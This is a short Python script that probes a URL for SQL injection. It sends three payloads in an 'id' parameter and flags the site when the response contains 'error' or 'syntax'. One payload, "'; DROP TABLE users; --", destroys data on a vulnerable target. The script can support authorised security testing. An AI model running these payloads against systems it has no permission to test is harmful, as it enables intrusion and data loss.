import requests

# List of common SQL injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL, NULL --",
]

def check_sql_injection(url):
    results = []
    for payload in SQL_PAYLOADS:
        try:
            # Injecting payload into a test parameter
            test_url = f"{url}?id={payload}"
            response = requests.get(test_url, timeout=10)

            if "error" in response.text.lower() or "syntax" in response.text.lower():
                results.append({
                    'url': test_url,
                    'payload': payload,
                    'vulnerable': True
                })
            else:
                results.append({
                    'url': test_url,
                    'payload': payload,
                    'vulnerable': False
                })

        except requests.RequestException as e:
            results.append({
                'url': test_url,
                'payload': payload,
                'error': str(e),
                'vulnerable': 'Unknown'
            })

    return results
